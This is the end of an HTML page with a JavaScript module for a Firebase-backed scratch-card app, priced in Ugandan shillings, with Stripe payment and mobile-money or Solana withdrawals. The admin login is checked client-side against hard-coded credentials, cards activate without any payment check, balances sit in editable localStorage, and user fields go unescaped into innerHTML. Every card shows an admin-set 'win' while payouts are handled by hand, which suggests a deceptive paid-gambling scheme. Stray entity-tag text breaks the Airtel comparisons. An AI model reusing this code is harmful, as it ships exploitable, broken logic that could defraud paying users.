<div class="card" id="dashboardcard" style="display:none">
  <div style="font-weight:700;margin-bottom:8px">🎴 scratch card ready</div>
  <div class="scratch-area" onclick="openScratchCard()">
    <div class="scratch-cover">
      <div class="icon">🎴</div>
      <div>TAP TO REVEAL</div>
      <div style="font-size:16px;color:#00ff88;margin-top:12px">YOU WON: UGX <span id="previewwin">0</span></div>
    </div>
  </div>
</div>

<div id="scratch" class="screen">
  <div class="header"><span class="back-btn" onclick="showScreen('home')">←</span>scratch card<span class="logout" onclick="logout()">🚪</span></div>
  <div id="noscratch" style="text-align:center;padding:80px 20px;color:#666"><div style="font-size:60px">🎴</div><div style="font-size:18px;font-weight:700">No active card</div></div>
  <div class="scratch-container" id="scratchcontainer">
    <div class="scratch-area" id="area">
      <div class="scratch-cover" id="cover">
        <div class="icon">🎴</div>
        <div>SCRATCH HERE</div>
        <div style="font-size:16px;margin-top:12px;color:#00ff88">Prize: UGX <span id="previewwin2">0</span></div>
      </div>
      <div><div>CONGRATULATIONS!</div><div class="scratch-amount">ugx <span id="win">0</span></div></div>
    </div>
  </div>
  <div id="res"></div>
</div>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, onSnapshot, doc, getDoc, setDoc, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyB5jGFyvFxHY4mlejAvSerYkqqHq_J7YKQ",
  authDomain: "jada-card.firebaseapp.com",
  projectId: "jada-card",
  storageBucket: "jada-card.firebasestorage.app",
  messagingSenderId: "658789024478",
  appId: "1:658789024478:web:78b85f82d87e9cdbf4b84f"
};
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
emailjs.init("I12UIAChWa_pR03-M");

const ADMIN_NAME = "JADA CARD";
const ADMIN_PHONE = "+256788417769";
const STRIPE_LINK = "https://buy.stripe.com/5kQ4gz20Ugcm2ADgZZes000";

const CARD_COST = 3600;
const MIN_WITHDRAW = 50000;

let currentUser = null;
let currentUserId = null;
let GLOBAL_WIN_AMOUNT = 0; // Changed from 50000 to 0 - no static price
let WIN_LOCKED = false;

// NAV
function showUserNav(){ document.getElementById('bottomnav').classList.add('show'); }
function hideUserNav(){ document.getElementById('bottomnav').classList.remove('show'); }

window.showScreen = function(id){
  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  document.querySelectorAll('.nav-btn').forEach(n=>n.classList.remove('active'));
  if(id==='home') {document.querySelectorAll('.nav-btn')[0].classList.add('active'); setTimeout(checkCardStatus, 100); displayHomeRecords();}
  if(id==='scratch') {document.querySelectorAll('.nav-btn')[1].classList.add('active'); checkScratchStatus();}
  if(id==='wallet') {document.querySelectorAll('.nav-btn')[2].classList.add('active'); updateBalance(); updateWithdrawButton(); displayUserRecords();}
}

window.login = function(){
  const name = document.getElementById('fullname').value.trim();
  const code = document.getElementById('countrycode').value;
  const digits = document.getElementById('phonedigits').value.trim();
  if(!name ||!code ||!digits || digits.length!==9) return alert('fill all fields. 9 digits');
  const phone = code + digits;
  currentUserId = btoa(phone).replace(/=/g,'');
  const saved = localStorage.getItem('user_'+currentUserId);
  currentUser = saved? JSON.parse(saved) : {name,phone,balance:0,status:'none',winningAmount:0,withdrawMethod:'',withdrawPhone:'',withdrawName:'',solanaAddress:'',records:[]};
  localStorage.setItem('user_'+currentUserId, JSON.stringify(currentUser));

  showUserNav();
  loadGlobalSettings();
  updateBalance();
  showScreen('home');
  setTimeout(listenGlobalSettings, 500);
}

window.goAdminLogin = function(){ hideUserNav(); showScreen('adminlogin'); }
window.adminLogin = function(){
  const name = document.getElementById('adminname').value.trim();
  const code = document.getElementById('admincountry').value;
  const digits = document.getElementById('adminphonedigits').value.trim();
  if(name === ADMIN_NAME && code+digits === ADMIN_PHONE){
    hideUserNav();
    loadGlobalSettings();
    showScreen('adminpanel');
    loadPayers();
    loadWithdrawals(); // REALTIME WITHDRAWALS FOR ADMIN
  } else alert('invalid credentials');
}
window.logout = function(){ currentUser=null; currentUserId=null; hideUserNav(); showScreen('login'); }

// LOAD GLOBAL WIN SETTINGS
async function loadGlobalSettings(){
  const settingsRef = doc(db, "settings", "global");
  const snap = await getDoc(settingsRef);
  if(snap.exists()){
    GLOBAL_WIN_AMOUNT = snap.data().winAmount || 0; // No default 50000
    WIN_LOCKED = snap.data().locked || false;
  }
  document.getElementById('winamount').value = GLOBAL_WIN_AMOUNT;
  updateLockUI();
}

window.toggleLock = async function(){
  WIN_LOCKED =!WIN_LOCKED;
  await setDoc(doc(db, "settings", "global"), {winAmount: GLOBAL_WIN_AMOUNT, locked: WIN_LOCKED});
  updateLockUI();
}

function updateLockUI(){
  const btn = document.getElementById('lockbtn');
  const status = document.getElementById('lockstatus');
  const input = document.getElementById('winamount');
  if(WIN_LOCKED){
    btn.textContent = '🔒 LOCKED - Price Fixed';
    btn.classList.add('locked');
    status.textContent = 'Status: LOCKED. All users win UGX ' + GLOBAL_WIN_AMOUNT.toLocaleString();
    status.style.color = '#00ff88';
    input.disabled = true;
  } else {
    btn.textContent = '🔓 UNLOCKED - Tap to Lock Price';
    btn.classList.remove('locked');
    status.textContent = 'Status: UNLOCKED. Type amount 0-1,000,000 then lock';
    status.style.color = '#ffaa00';
    input.disabled = false;
  }
}

window.saveWinAmount = async function(){
  if(WIN_LOCKED) return alert('Price is LOCKED. Unlock first to change amount');
  const amount = parseInt(document.getElementById('winamount').value);
  if(isNaN(amount) || amount < 0 || amount > 1000000) return alert('Enter amount between 0 and 1,000,000 UGX');
  GLOBAL_WIN_AMOUNT = amount;
  WIN_LOCKED = true;
  await setDoc(doc(db, "settings", "global"), {winAmount: GLOBAL_WIN_AMOUNT, locked: WIN_LOCKED});
  updateLockUI();
  alert('✅ Amount locked at UGX ' + GLOBAL_WIN_AMOUNT.toLocaleString());
}

window.pay = async function(){
  if(!currentUser) return alert('login first');
  if(currentUser.status==='active') return alert('You have active card. Reveal it first');

  window.open(STRIPE_LINK, '_blank');
  currentUser.status = 'active';
  currentUser.winningAmount = GLOBAL_WIN_AMOUNT; // DYNAMIC PRICE
  saveUser();

  await addDoc(collection(db, "payers"), {
    userId: currentUserId,
    name: currentUser.name,
    phone: currentUser.phone,
    amount: CARD_COST,
    winAmount: GLOBAL_WIN_AMOUNT,
    timestamp: serverTimestamp()
  });

  checkCardStatus();
  alert('Card activated! Tap to reveal UGX ' + GLOBAL_WIN_AMOUNT.toLocaleString());
}

window.adminTab = function(tab, el){
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.admin-content').forEach(c=>c.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('admin-'+tab).classList.add('active');
  if(tab==='users') loadPayers();
  if(tab==='withdrawals') loadWithdrawals();
}

// LOAD PAYERS
function loadPayers(){
  const q = query(collection(db, "payers"), orderBy("timestamp", "desc"));
  onSnapshot(q, (snapshot) => {
    const payers = [];
    snapshot.forEach((doc) => payers.push(doc.data()));
    const list = document.getElementById('userlist');
    if(!payers.length){ list.innerHTML = 'No payers yet'; return; }
    list.innerHTML = payers.map(c => {
      const time = c.timestamp? new Date(c.timestamp.toDate()).toLocaleString() : '';
      return `<div class="user-row"><div>
        <div style="font-weight:700">${c.name}</div>
        <div style="font-size:11px">${c.phone}</div>
        <div style="font-size:10px;color:#00ff88">Paid UGX ${c.amount} | Won UGX ${c.winAmount.toLocaleString()}</div>
        <div style="font-size:9px;color:#888">${time}</div>
      </div></div>`;
    }).join('');
  });
}

// LOAD WITHDRAWALS - REALTIME FOR ADMIN
function loadWithdrawals(){
  const q = query(collection(db, "withdrawals"), orderBy("timestamp", "desc"));
  onSnapshot(q, (snapshot) => {
    const withdraws = [];
    snapshot.forEach((doc) => withdraws.push({id: doc.id,...doc.data()}));
    const list = document.getElementById('withdrawlist');
    const badge = document.getElementById('withdrawbadge');

    if(!withdraws.length){
      list.innerHTML = 'No withdrawal requests yet';
      badge.style.display = 'none';
      return;
    }

    const pending = withdraws.filter(w => w.status==='pending');
    badge.textContent = pending.length;
    badge.style.display = pending.length>0? 'flex' : 'none';

    list.innerHTML = withdraws.map(w => {
      const color = w.status==='pending'?'#ffaa00':w.status==='approved'?'#00ff88':'#ff0044';
      const time = w.timestamp? new Date(w.timestamp.toDate()).toLocaleString() : '';
      let btns = w.status==='pending'?
        `<button class="btn btn-success" style="width:45px;height:45px;padding:0;font-size:20px" onclick="approveWithdraw('${w.id}')">✅</button>
         <button class="btn btn-danger" style="width:45px;height:45px;padding:0;font-size:20px" onclick="rejectWithdraw('${w.id}')">❎</button>` :
        `<div style="color:${color};font-weight:700">${w.status.toUpperCase()}</div>`;

      return `<div class="user-row"><div>
        <div style="font-weight:700">${w.name}</div>
        <div style="font-size:11px">${w.phone}</div>
        <div style="color:#00ff88;font-weight:800;font-size:14px">UGX ${w.amount.toLocaleString()}</div>
        <div style="font-size:10px">Method: <b>${w.method}</b></div>
        <div style="font-size:10px">Details: <b>${w.details}</b></div>
        <div style="font-size:9px;color:#888">${time}</div>
      </div><div>${btns}</div></div>`;
    }).join('');
  });
}

window.approveWithdraw = async function(id){
  await setDoc(doc(db, "withdrawals", id), {status: "approved", approvedAt: serverTimestamp()}, {merge: true});
  alert('✅ Approved. Pay user manually');
}

window.rejectWithdraw = async function(id){
  await setDoc(doc(db, "withdrawals", id), {status: "rejected"}, {merge: true});
  alert('❎ Rejected');
}

// LISTEN GLOBAL SETTINGS - UPDATE CARD LIVE, NO STATIC 50000
function listenGlobalSettings(){
  const settingsRef = doc(db, "settings", "global");
  onSnapshot(settingsRef, (snap) => {
    if(snap.exists()){
      GLOBAL_WIN_AMOUNT = snap.data().winAmount || 0;
      WIN_LOCKED = snap.data().locked || false;

      // UPDATE ALL DASHBOARD ELEMENTS IMMEDIATELY
      const previewWin = document.getElementById('previewwin');
      const previewWin2 = document.getElementById('previewwin2');

      if(previewWin) previewWin.textContent = GLOBAL_WIN_AMOUNT.toLocaleString();
      if(previewWin2) previewWin2.textContent = GLOBAL_WIN_AMOUNT.toLocaleString();

      // Update active card
      if(currentUser && currentUser.status==='active'){
        currentUser.winningAmount = GLOBAL_WIN_AMOUNT;
        saveUser();
        checkCardStatus();
      }
    }
  });
}

function updateBalance(){
  if(currentUser){
    document.getElementById('balance').textContent=currentUser.balance.toLocaleString();
    document.getElementById('wbal').textContent=currentUser.balance.toLocaleString();
  }
}

function checkCardStatus(){
  if(!currentUser) return;
  const dashboardCard = document.getElementById('dashboardcard');
  const buyCard = document.getElementById('buyCard');

  if(currentUser.status==='active'){
    dashboardCard.style.display = 'block';
    buyCard.style.display = 'none';
    currentUser.winningAmount = GLOBAL_WIN_AMOUNT; // Always use live price
    saveUser();
    document.getElementById('previewwin').textContent = GLOBAL_WIN_AMOUNT.toLocaleString();
  } else {
    dashboardCard.style.display = 'none';
    buyCard.style.display = 'block';
  }
}

function checkScratchStatus(){
  if(!currentUser) return;
  const noscratch = document.getElementById('noscratch');
  const scratchcontainer = document.getElementById('scratchcontainer');
  if(currentUser.status==='active'){ noscratch.style.display='none'; scratchcontainer.classList.add('show'); }
  else { noscratch.style.display='block'; scratchcontainer.classList.remove('show'); }
}

function displayHomeRecords(){
  const recordsDiv = document.getElementById('homerecords');
  if(!recordsDiv) return;
  if(!currentUser ||!currentUser.records || currentUser.records.length === 0){
    recordsDiv.innerHTML = '<div style="text-align:center;color:#666;padding:20px">No records yet</div>';
    return;
  }
  recordsDiv.innerHTML = currentUser.records.map(r => {
    const date = new Date(r.date).toLocaleString();
    const color = r.status === 'WIN'? '#00ff88' : r.status === 'WITHDRAW'? '#ffaa00' : '#ff0044';
    let text = '';
    if(r.status === 'WIN') text = `+ UGX ${r.amount.toLocaleString()}`;
    else if(r.status === 'WITHDRAW') text = `- UGX ${r.amount.toLocaleString()}`;
    else text = 'LOSS - 0';
    const icon = r.status === 'WIN'? '🎉' : r.status === 'WITHDRAW'? '💸' : '😔';
    return `<div class="record-item"><div style="font-size:11px">${icon} ${date}</div><div style="color:${color};font-weight:800">${text}</div></div>`;
  }).join('');
}

function displayUserRecords(){
  const recordsDiv = document.getElementById('userrecords');
  if(!recordsDiv) return;
  if(!currentUser ||!currentUser.records || currentUser.records.length === 0){
    recordsDiv.innerHTML = 'No records yet';
    return;
  }
  recordsDiv.innerHTML = currentUser.records.map(r => {
    const date = new Date(r.date).toLocaleDateString();
    const time = new Date(r.date).toLocaleTimeString();
    const color = r.status === 'WIN'? '#00ff88' : r.status === 'WITHDRAW'? '#ffaa00' : '#ff0044';
    let text = '';
    if(r.status === 'WIN') text = `+ UGX ${r.amount.toLocaleString()}`;
    else if(r.status === 'WITHDRAW') text = `- UGX ${r.amount.toLocaleString()}`;
    else text = '0';
    return `<div class="record-item"><div style="font-size:11px">${date} ${time}</div><div style="color:${color};font-weight:800">${text}</div></div>`;
  }).join('');
}

function saveUser(){
  if(currentUser&&currentUserId) localStorage.setItem('user_'+currentUserId, JSON.stringify(currentUser));
}

window.openScratchCard = function(){
  if(!currentUser || currentUser.status!=='active') return alert('No active card');
  showScreen('scratch');
  document.getElementById('previewwin2').textContent = GLOBAL_WIN_AMOUNT.toLocaleString();
  currentUser.winningAmount = GLOBAL_WIN_AMOUNT;
  saveUser();
}

window.revealCard = function(){
  if(!currentUser || currentUser.status!=='active') return;

  const winAmount = GLOBAL_WIN_AMOUNT; // USE LIVE PRICE
  currentUser.balance += winAmount;

  if(!currentUser.records) currentUser.records = [];
  currentUser.records.unshift({
    date: Date.now(),
    amount: winAmount,
    status: 'WIN'
  });
  if(currentUser.records.length > 100) currentUser.records = currentUser.records.slice(0, 100);

  currentUser.status = 'none';
  currentUser.winningAmount = 0;
  saveUser();

  document.getElementById('cover').style.display = 'none';
  document.getElementById('win').textContent = winAmount.toLocaleString();

  const resDiv = document.getElementById('res');
  resDiv.innerHTML = `
    <div class="result-win">
      <div style="font-size:20px;font-weight:800">🎉 CONGRATULATIONS!</div>
      <div style="font-size:14px;color:#888;margin-top:5px">You Won</div>
      <div class="result-amount-win">UGX ${winAmount.toLocaleString()}</div>
      <div style="margin-top:12px;font-size:12px">Recorded & Added to balance</div>
      <button class="btn" onclick="showScreen('home')" style="margin-top:15px">Back to Dashboard</button>
    </div>
  `;

  updateBalance();
  displayHomeRecords();
  displayUserRecords();
}

document.addEventListener('DOMContentLoaded', function(){
  setTimeout(() => {
    const cover = document.getElementById('cover');
    if(cover) cover.onclick = revealCard;
  }, 1000);
});

window.toggleWithdrawFields = function(){
  const method = document.getElementById('withdrawmethod').value;
  document.getElementById('mobilefields').style.display = (method==='MTN' || method==='【entity-Airtel¦canonical_name=Airtel】')? 'block' : 'none';
  document.getElementById('solanafields').style.display = method==='Solana'? 'block' : 'none';
}

window.saveWithdrawal = function(){
  if(!currentUser) return alert('login first');
  const method = document.getElementById('withdrawmethod').value;
  if(!method) return alert('select method');

  if(method==='MTN' || method===' 【entity-Airtel¦canonical_name=Airtel】'){
    const name = document.getElementById('withdrawname').value.trim();
    const code = document.getElementById('withdrawcountry').value;
    const phone = document.getElementById('withdrawphone').value.trim();
    if(!name ||!code ||!phone || phone.length!==9) return alert('fill all fields. 9 digits');
    currentUser.withdrawMethod = method;
    currentUser.withdrawName = name;
    currentUser.withdrawPhone = code + phone;
    currentUser.solanaAddress = '';
  } else {
    const address = document.getElementById('solanaaddress').value.trim();
    if(!address || address.length < 32) return alert('enter valid solana address');
    currentUser.withdrawMethod = 'Solana';
    currentUser.solanaAddress = address;
    currentUser.withdrawName = '';
    currentUser.withdrawPhone = '';
  }

  saveUser();
  alert('✅ Withdrawal details saved!');
  showScreen('wallet');
}

window.updateWithdrawButton = function(){
  const btn = document.getElementById('withdrawbtn');
  if(!currentUser) return;

  if(currentUser.balance >= MIN_WITHDRAW){
    btn.disabled = false;
    btn.textContent = `💸 Withdraw UGX ${currentUser.balance.toLocaleString()}`;
    btn.style.background = 'linear-gradient(135deg,#00ff88,#00cc66)';
  } else {
    btn.disabled = true;
    btn.textContent = `Min 50,000 UGX - You have ${currentUser.balance.toLocaleString()}`;
    btn.style.background = '#333';
  }
}

window.withdraw = async function(){
  if(!currentUser) return alert('login first');
  if(currentUser.balance < MIN_WITHDRAW) return alert('Min withdraw 50,000 UGX');
  if(!currentUser.withdrawMethod) return alert('Set withdrawal details first');

  const amount = currentUser.balance;
  let details = '';

  if(currentUser.withdrawMethod==='MTN' || currentUser.withdrawMethod==='Airtel'){
    details = currentUser.withdrawPhone + ' - ' + currentUser.withdrawName;
  } else {
    details = currentUser.solanaAddress;
  }

  await addDoc(collection(db, "withdrawals"), {
    userId: currentUserId,
    name: currentUser.name,
    phone: currentUser.phone,
    amount: amount,
    method: currentUser.withdrawMethod,
    details: details,
    status: "pending",
    timestamp: serverTimestamp()
  });

  currentUser.balance = 0;
  if(!currentUser.records) currentUser.records = [];
  currentUser.records.unshift({
    date: Date.now(),
    amount: amount,
    status: 'WITHDRAW'
  });
  if(currentUser.records.length > 100) currentUser.records = currentUser.records.slice(0, 100);

  saveUser();
  updateBalance();
  updateWithdrawButton();
  displayUserRecords();
  displayHomeRecords();

  alert('✅ Withdrawal request sent to admin!\nAmount: UGX ' + amount.toLocaleString());
}
</script>
</body>
</html>
